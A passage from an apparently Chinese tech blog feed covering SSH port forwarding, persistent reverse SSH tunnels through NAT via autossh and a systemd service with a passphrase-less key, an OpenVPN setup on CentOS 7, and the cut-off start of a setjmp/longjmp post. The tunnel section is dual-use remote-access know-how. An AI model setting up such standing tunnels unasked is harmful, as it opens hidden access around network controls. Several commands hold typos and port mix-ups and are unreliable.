class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 28392 root@a.site</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>-D   动态端口转发(Socket代理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -D 1080  a.site  # D is For Dynamic</span><br></pre></td></tr></table></figure><p><code>-D</code> 是建立在TCP/IP应用层的动态端口转发。这条命令相当于监听本地1080端口作为SOCKS5代理服务器， 所有到该端口的请求都会被代理(转发)到a.site，就好像请求是从a.site发出一样。</p><p>​    访问原先本机无法访问而a.site可以访问的网络资源，不限协议(HTTP/SSH/FTP, Tcp/Udp) 。</p><p>​</p></li></ul><ul><li><p>-L    本地端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主机B $ ssh -L 2222:localhost:22  a.site</span><br><span class="line"></span><br><span class="line">ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><p>​    该命令的作用是，绑定本机B  2222端口，当有到2222端口的链接时，该链接会经由安全通道(secure channel)转发到a.site，由a.site建立一个到 Localhost:2222  —-&gt; a.site:22 端口的链接 。</p><p>​</p></li><li><p>-R  远程端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B $ ssh -R 8080:localhost:80  a.site</span><br></pre></td></tr></table></figure><p>远程转发就是在SSH链接成功后，绑定目标主机的指定端口 8080, 并转发本地网络的 80端口。</p><p>如本机B 80端口存在HTTP服务。那么使用上述命令， 主机A即可在浏览器<code>http://localhost:8080</code> 访问主机B服务。   b:80 —-&gt;   a.site:8080</p><p>与本地端口转发，转发方向相反。</p><p>​</p></li><li><p>-W  stdio转发(netcat模式) 与ProxyJump</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -W localhost:23  a.site</span><br></pre></td></tr></table></figure><p>​    netcat 模式可谓是SSH的杀手特性: 通过-W 参数开启到目标网络某主机和端口的stdio转发， 可以看做是组合<code>netcat (nc) 和 ssh -L</code> 。 上述命令相当于将本机的标准输入输出链接到了 a.site的telnet端口， 就像在a.site 上执行telnet localhost 一样, 而且不需要在本机运行telnet。</p><p>​    直接转发stdio，用来做ssh跳板。 <code>ssh -W</code>常被用来构建主机到主机的透明隧道代理，而在ProxyJump其实就是基于stdio转发做的简化，专门用于链式的SSH跳板。</p></li></ul><ul><li><code>-q</code>: quiet模式，忽视大部分的警告和诊断信息（比如端口转发时的各种连接错误）</li><li><code>-T</code>: 禁用tty分配(pseudo-terminal allocation)</li><li><code>-f</code>: 登录成功后即转为后台任务执行</li><li><code>-N</code>: 不执行远程命令（专门做端口转发）</li><li><code>-n</code>: 重定向stdin为<code>/dev/null</code>，用于配合<code>-f</code>后台任务</li></ul><h4 id="SSH-反向转发"><a href="#SSH-反向转发" class="headerlink" title="SSH 反向转发"></a>SSH 反向转发</h4><p>​    实质是由B向A主动建立SSH转发，将A的6766端口转发到B的22端口上，只要这条转发不关闭，这个转发链路就是有效的。 有了此端口链路，只需要访问A的6766端口，即可实现反向链接B主机。</p><ul><li><p>在B上建立一个SSH转发，将主机A的6766端口转发到主机B的22端口上:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B:  $ssh -p 22 -qTfNn -R 4444:localhost:22 47.104.84.21</span><br></pre></td></tr></table></figure><p><code>-qTfNn</code>用于告知ssh连接成功后就转到后台运行</p><ul><li><code>-q</code>: quiet模式，忽视大部分的警告和诊断信息（比如端口转发时的各种连接错误）</li><li><code>-T</code>: 禁用tty分配(pseudo-terminal allocation)</li><li><code>-f</code>: 登录成功后即转为后台任务执行</li><li><code>-N</code>: 不执行远程命令（专门做端口转发）</li><li><code>-n</code>: 重定向stdin为<code>/dev/null</code>，用于配合<code>-f</code>后台任务</li></ul></li></ul><ul><li><p>然后在主机A上利用6766端口反向SSH到主机B:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机A:  $ssh -p 4444 user-b@localhost</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h4 id="转发维持"><a href="#转发维持" class="headerlink" title="转发维持"></a>转发维持</h4><p><strong>稳定性维持</strong></p><p>​    SSH链接时会超时关闭，如果链接关闭，那么转发将无法维持，那么A就无法利用反向转发穿透主机B 所在的NAT了。</p><p>​    <code>autossh</code> 这个软件会在超时之后自动重新建立SSH转发，用于解决转发的稳定性问题。</p><ul><li><p>Debian 系列下载&amp;&amp;安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git://anonscm.debian.org/collab-maint/autossh.git</span><br><span class="line">cd autossh</span><br><span class="line">./configure  &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>Redhat 系列下载&amp;&amp;安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git://anonscm.debian.org/collab-maint/autossh.git</span><br><span class="line">cd autossh</span><br><span class="line">./configure  &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>​</p></li></ul><p><strong>操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B  $ autossh  -p 22 -M 4444 -NR  4444:localhost:22 user-a@a.site</span><br></pre></td></tr></table></figure><p><code>-M</code> 参数指定的端口用来监听转发的状态，与端口转发无关。</p><p>之后可以在主机user-A 通过4444 端口访问主机B；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机A $ssh -p 4444 user-b@localhost</span><br></pre></td></tr></table></figure><h4 id="转发自动建立"><a href="#转发自动建立" class="headerlink" title="转发自动建立"></a>转发自动建立</h4><p>主机B 重启， 建立的转发就会失效， 因此需要在主机B启动时 默认启动autossh来建立SSH转发。</p><p>利用SSH反向转发，使用内网主机C SSH链接内网主机B;</p><p>首先在主机A上编辑 sshd 的配置文件 <code>/etc/ssh/sshd_config</code>,  将 <code>GatewayPorts</code>开关打开:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetewayPorts yes</span><br></pre></td></tr></table></figure><p>然后重启<code>sshd</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机A:  $ sudo systemctl restart sshd</span><br></pre></td></tr></table></figure><p>然后在主机B上对之前用的autossh指令略加修改:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B   $ autossh -p 22 -M 4444 -NR &apos;*:4444:localhost:22&apos; user-a@a.site</span><br></pre></td></tr></table></figure><p>之后在主机C上利用主机A的4444端口SSH链接到B:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机C   $ ssh -p 4444 user-b@a.site</span><br></pre></td></tr></table></figure><p><strong>systemd 服务编写</strong></p><ul><li><p>开启公网 主机 A 上SSHD的<code>autossh</code>开关，并重启SSHD</p></li><li><p>创建主机B用户SSH密码，并上传主机A (用于自动链接)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机B $ ssh-keygen -t &apos;rsa&apos; -C &apos;user-b@b.site&apos;</span><br><span class="line">主机B $ ssh-copy-id user-a@a.site</span><br></pre></td></tr></table></figure><p><strong>该秘钥不需要设置密码</strong> 运行<code>ssh-keygen</code>指令时尽管一路回车，不要输入额外字符。</p><p>​</p></li><li><p>主机B配置service自启动文件</p><p>然后在主机B上创建以 user-b用户权限调用 aotussh 的service文件。</p><p><code>cat /lib/systemd/system/autossh.service</code>  设置其权限为 644</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Auto SSH Tunnel</span><br><span class="line">After=network-online.target</span><br><span class="line">[Service]</span><br><span class="line">User=autossh</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/autossh -p 22 -M 4444 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsa</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=always</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">WantedBy=graphical.target</span><br></pre></td></tr></table></figure><p>在主机B上使其生效:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B $ systemctl enable NetworkManager-wait-online</span><br></pre></td></tr></table></figure><p>设置该服务自启动:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机B $ sudo systemctl enable autossh</span><br></pre></td></tr></table></figure></li></ul><p>此时即可在主机A上使用这条反向链路链接主机B</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机A  $ ssh -p 4444 user-b@localhost</span><br></pre></td></tr></table></figure><p>或者主机C上直接穿透两层NAT转换， 直接SSH链接主机B</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机C $ ssh -p 4444 user-b@a.site</span><br></pre></td></tr></table></figure><h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>公网A， 内网B， 内网C， B，C不在同一局域网， 进行SSH转发，B 链接C</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主机C  $ ssh -p 28392 -qfNn -R  8834:localhost:22  root@45.78.55.192</span><br><span class="line">root@Kali:/var/log# ps -ef |grep ssh</span><br><span class="line">root       1009    960  0 Mar05 ?        00:00:04 /usr/bin/ssh-agent gnome-session</span><br><span class="line">root       7068      1  0 Mar05 ?        00:00:11 sshd: root@pts/1</span><br><span class="line">root      30997      1  0 05:17 ?        00:00:00 /usr/sbin/sshd -D</span><br><span class="line">root      32709      1  0 Mar05 ?        00:00:12 sshd: root@pts/3</span><br><span class="line">root     111145      1  0 20:21 ?        00:00:00 ssh -p 28392 -qfNn -R 8834:localhost:22 root@45.78.55.192</span><br><span class="line">root     111248  30997  0 20:22 ?        00:00:00 sshd: root@pts/4</span><br><span class="line">root     111399  32711  0 20:23 pts/3    00:00:00 grep ssh</span><br></pre></td></tr></table></figure><p>然后在公网A查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation ssh]# netstat -anp | grep 28392</span><br><span class="line">tcp        0      0 0.0.0.0:28392           0.0.0.0:*               LISTEN      13382/sshd      </span><br><span class="line"></span><br><span class="line">[root@pgunimation ssh]# ssh -p 8834 root@localhost</span><br><span class="line">The authenticity of host &apos;[localhost]:8834 ([127.0.0.1]:8834)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:kJ5gXQpOfCHHfFa3EW0uJKOpJcjRRdfIcNsClCaCed4.</span><br><span class="line">ECDSA key fingerprint is MD5:b1:71:01:bf:ed:ba:e3:ba:d0:8c:0c:97:68:fa:90:c0.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;[localhost]:8834&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">root@localhost&apos;s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Mar  7 05:12:40 2018 from ::1</span><br><span class="line">root@Kali:~# exit                ## ---- 此处已经链接；</span><br></pre></td></tr></table></figure><p>主机C执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主机C Postgres@sucro109:~$ ssh -p 8834 root@45.78.55.192   ## 进行链接主机B， 因为 8834即绑定主机B</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SSH </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Centos 7 搭建OpenVpn</title>
      <link href="/2018/03/06/yunwei/Centos-7-%E6%90%AD%E5%BB%BAOpenVpn/"/>
      <url>/2018/03/06/yunwei/Centos-7-%E6%90%AD%E5%BB%BAOpenVpn/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation etc]# cat system-release</span><br><span class="line">CentOS Linux release 7.4.1708 (Core)</span><br></pre></td></tr></table></figure><h4 id="下载"><a href="#下载" class="headerlink" title="下载:"></a>下载:</h4><p>下载OpenVPN源码包，下载地址：<br><a href="https://link.jianshu.com/?t=https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz" target="_blank" rel="noopener">https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://swupdate.openvpn.org/community/releases/openvpn-2.4.0.tar.gz</span><br></pre></td></tr></table></figure><p>下载OpenVPN证书制作工具EasyRSA，下载地址：<br><a href="https://link.jianshu.com/?t=https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz" target="_blank" rel="noopener">https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/OpenVPN/easy-rsa/releases/download/3.0.1/EasyRSA-3.0.1.tgz</span><br></pre></td></tr></table></figure><a id="more"></a><p><br></p><h4 id="安装Openvpn"><a href="#安装Openvpn" class="headerlink" title="安装Openvpn"></a>安装Openvpn</h4><p>安装依赖软件包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openssl openssl-devel pam pam-devel</span><br></pre></td></tr></table></figure><p><strong>安装Openvpn:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf openvpn-2.4.0.tar.gz</span><br><span class="line">cd openvpn*</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install </span><br><span class="line">mkdir /etc/openvpn # 创建配置文件存放目录 </span><br><span class="line">cp sample/sample-config-files/server.conf /etc/openvpn/server.conf # 从模板复制一份配置文件</span><br></pre></td></tr></table></figure><p><strong>异常问题:</strong></p><p>但是在<code>./configure</code>时，出现异常:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checking for LZ4_compress in -llz4... no</span><br><span class="line">LZ4 library not found.</span><br><span class="line">checking lz4.h usability... no</span><br><span class="line">checking lz4.h presence... no</span><br><span class="line">checking for lz4.h... no</span><br><span class="line">LZ4 headers not found.</span><br><span class="line">LZ4 library or header not found, using version in src/compat/compat-lz4.*</span><br><span class="line">checking git checkout... no</span><br><span class="line">configure: error: lzo enabled but missing</span><br></pre></td></tr></table></figure><p><strong>lzo</strong><br>​    LZO 是致力于解压速度的一种数据压缩算法，LZO 是 Lempel-Ziv-Oberhumer 的缩写。这个算法是无损算法，参考实现程序是线程安全的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@pgunimation ~]# yum search lzo</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: centos.s.uw.edu</span><br><span class="line"> * elrepo-kernel: repos.lax-noc.com</span><br><span class="line"> * extras: repos-lax.psychz.net</span><br><span class="line"> * updates: centos-distro.cavecreek.net</span><br><span class="line">===================================================================================== N/S matched: lzo ======================================================================================</span><br><span class="line">lzo-devel.i686 : Development files for the lzo library</span><br><span class="line">lzo-devel.x86_64 : Development files for the lzo library</span><br><span class="line">lzo-minilzo.i686 : Mini version of lzo for apps which don&apos;t need the full version</span><br><span class="line">lzo-minilzo.x86_64 : Mini version of lzo for apps which don&apos;t need the full version</span><br><span class="line">lzo.i686 : Data compression library with very fast (de)compression</span><br><span class="line">lzo.x86_64 : Data compression library with very fast (de)compression</span><br><span class="line">lzop.x86_64 : Real-time file compressor</span><br><span class="line"></span><br><span class="line">  Name and summary matches only, use &quot;search all&quot; for everything.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@pgunimation ~]# yum -install lzo-devel.x86_64  ## 进行安装；</span><br></pre></td></tr></table></figure><p><br></p><h4 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h4><ul><li><p>制作根证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxf EasyRSA-3.0.1.tgz</span><br><span class="line">cp -rf EasyRSA-3.0.1 /etc/openvpn/easy-rsa</span><br><span class="line">cd /etc/openvpn/easy-rsa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./easyrsa init-pki # 初始化证书目录pki</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/openvpn_01.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./easyrsa build-ca nopass # 创建根证书，提示输入Common Name，名称随意，但是不能和服务端证书或客户端证书名称相同</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/openvpn_02.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./easyrsa gen-dh # 生成Diffle Human参数，它能保证密钥在网络中安全传输</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/openvpn_03.png" alt=""></p><p>​</p></li></ul><ul><li><p>制作服务端证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./easyrsa build-server-full server nopass # server是服务端证书名称，可以用其它名称</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/openvpn_04.png" alt=""></p><p>​</p></li><li><p>制作客户端证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./easyrsa build-client-full client1 nopass # client1是客户端证书名称，可以用其它名称</span><br></pre></td></tr></table></figure><p><img src="/img/yunwei/openvpn_04.png" alt=""></p></li></ul><p><br></p><h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">local a.b.c.d # 填服务器真实IP</span><br><span class="line">port 1194</span><br><span class="line">proto tcp</span><br><span class="line">dev tun</span><br><span class="line">ca /etc/openvpn/easy-rsa/pki/ca.crt</span><br><span class="line">cert /etc/openvpn/easyrsa/pki/issued/server.crt</span><br><span class="line">key /etc/openvpn/easyrsa/pki/private/server.key</span><br><span class="line">dh /etc/openvpn/easyrsa/pki/dh.pem</span><br><span class="line">server 10.8.1.0 255.255.255.0 # 给客户端分配的IP段</span><br><span class="line">ifconfig-pool-persist ipp.txt # 记录客户端和虚拟ip的映射关系，当客户端重新连接时依然被分配断开之前的IP地址</span><br><span class="line">push &quot;redirect-gateway def1 bypass-dhcp&quot; # 重定向客户端网关</span><br><span class="line">push &quot;dhcp-option DNS 8.8.8.8&quot; # 选择一个DNS，这里用Google的DNS示例</span><br><span class="line">client-to-client</span><br><span class="line">keepalive 10 120</span><br><span class="line">compress lz4-v2</span><br><span class="line">push &quot;compress lz4-v2&quot;</span><br><span class="line">user nobody</span><br><span class="line">group nobody</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">status /var/log/openvpn-status.log</span><br><span class="line">log /var/log/openvpn.log</span><br><span class="line">verb 3 # 日志等级</span><br></pre></td></tr></table></figure><p>开启路由转发支持，用 vi 编辑<code>/etc/sysctl.conf</code>文件，修改以下参数<br><code>net.ipv4.ip_forward = 1</code><br>执行下面命令使<code>sysctl.conf</code>配置文件生效并添加iptables转发规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br><span class="line">iptables -t nat -A POSTROUTING -s 10.8.1.0/24 -j MASQUERADE</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure><p>启动OpenVpn服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openvpn/sbin/openvpn --config /etc/openvpn/server.conf &amp;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/easy-rsa/pki/private/client1.key</span><br><span class="line">/etc/easy-rsa/pki/issued/client1.crt</span><br><span class="line">/etc/easy-rsa/pki/ca.crt</span><br></pre></td></tr></table></figure><p>Window - <a href="https://pan.baidu.com/s/1nsIx778RiUwV6y2kYzH45A" target="_blank" rel="noopener">openvpn下载</a></p><p>新建OpenVpn配置文件:   remote.ovpn:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto tcp</span><br><span class="line">remote x.x.x.x 1194 # 填服务器真实IP</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">ca ca.crt</span><br><span class="line">cert client1.crt</span><br><span class="line">key client1.key</span><br><span class="line">verb 3 # 日志等级</span><br></pre></td></tr></table></figure><p>Linux[Ubuntu/Debain]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install openvpn</span><br></pre></td></tr></table></figure><p>Linux[Centos-redhat]</p><p><br></p><h4 id="客户端用户密码登陆"><a href="#客户端用户密码登陆" class="headerlink" title="客户端用户密码登陆"></a>客户端用户密码登陆</h4><p><br></p><h4 id="异常报警"><a href="#异常报警" class="headerlink" title="异常报警:"></a>异常报警:</h4><ul><li><p><code>Options error: --explicit-exit-notify can only be used with --proto udp</code></p><p>此选项只与udp协议配合使用，所以注释此选项;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Notify the client that when the server restarts so it</span><br><span class="line"># can automatically reconnect.</span><br><span class="line">#explicit-exit-notify 2   ##将其注释;</span><br></pre></td></tr></table></figure><p>​</p></li></ul><ul><li><p><code>SIGUSR1[soft,connection-reset] received, client-instance restarting Connection reset, restarting</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Tue Mar  6 01:37:05 2018 TCP connection established with [AF_INET]112.229.125.230:54212</span><br><span class="line">Tue Mar  6 01:37:05 2018 112.229.125.230:54212 TLS: Initial packet from [AF_INET]112.229.125.230:54212, sid=ea308b9b f142b5c9</span><br><span class="line">Tue Mar  6 01:37:05 2018 112.229.125.230:54212 Connection reset, restarting [-1]</span><br><span class="line">Tue Mar  6 01:37:05 2018 112.229.125.230:54212 SIGUSR1[soft,connection-reset] received, client-instance restarting</span><br></pre></td></tr></table></figure><p>链接被重置: </p><p>​        <font color="“red”"> 未解决 </font>    切换协议为Udp是没问题; Tcp链接协议被重置;</p></li></ul><ul><li><p>Ubuntu <code>Authenticate/Decrypt packet error: cipher final failed</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">配置文件中添加：</span><br><span class="line">cipher AES-256-CBC   ## Ubuntu 默认编码不未AES-256-CBC</span><br></pre></td></tr></table></figure><p>​</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Centos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux setjmp &amp; longjmp</title>
      <link href="/2018/02/27/cpluscplus/Linux-setjmp-longjmp/"/>
      <url>/2018/02/27/cpluscplus/Linux-setjmp-longjmp/</url>
      
        <content type="html"><![CDATA[<p>错误处理是任何语言都需要解决的问题，任何语言都不能保证100%的正确运行，都需要异常机制的存在，例如c++ 的<code>try ... catch</code> , c 语言因此提供 setjmp 与 longjmp 来实现 内存堆栈的跳转。 实现一种<strong>非本地局部跳转</strong>的机制, 本地局部跳转如:<code>goto</code></p><p><br><br><a id="more"></a></p><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int setjmp(jmp_buf jb);</span><br><span class="line">void longjmp(jmp_buf jb, int r);</span><br></pre></td></tr></table></figure><ul><li><code>setjmp</code> 用于保存程序的运行时堆栈环境 <code>cs:ip</code> 寄存器;</li><li><code>longjmp</code> 恢复先前程序中调用setjmp 函数所保存的堆栈环境;</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 